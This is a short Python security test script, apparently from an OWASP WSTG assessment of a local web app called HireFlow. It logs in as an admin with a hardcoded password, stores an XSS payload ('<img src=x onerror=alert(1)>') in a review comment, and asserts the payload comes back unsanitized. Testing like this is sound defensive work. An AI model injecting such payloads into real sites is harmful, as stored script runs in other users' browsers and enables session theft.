"""
WSTG-INPV-02 / WSTG-CLNT-03: Stored HTML/XSS in review comments.
Expected: HTML payload is stored and returned unchanged by the reviews API.
"""
import requests

BASE = "http://localhost:3000"
FREELANCER_ID = "3fcfb3b4-8335-4b13-b813-3d425c3ecf7e"
PAYLOAD = "<img src=x onerror=alert(1)>wstg-stored-review"

admin = requests.post(f"{BASE}/api/auth/login", json={
    "email": "bob.admin@hireflow.com",
    "password": "password123",
}, timeout=10).json()

create = requests.post(f"{BASE}/api/reviews", headers={
    "Authorization": f"Bearer {admin['token']}",
}, json={
    "contract_id": "29c1f280-a139-4f25-8b90-1bf2ad2ff068",
    "reviewee_id": FREELANCER_ID,
    "rating": 5,
    "comment": PAYLOAD,
}, timeout=10)
review_id = create.json()["id"]

fetch = requests.get(f"{BASE}/api/reviews/{review_id}", timeout=10)
print("Stored:", fetch.json()["comment"])
assert fetch.status_code == 200
assert fetch.json()["comment"] == PAYLOAD
print("\n[VULNERABLE] Review HTML is stored unsanitized")
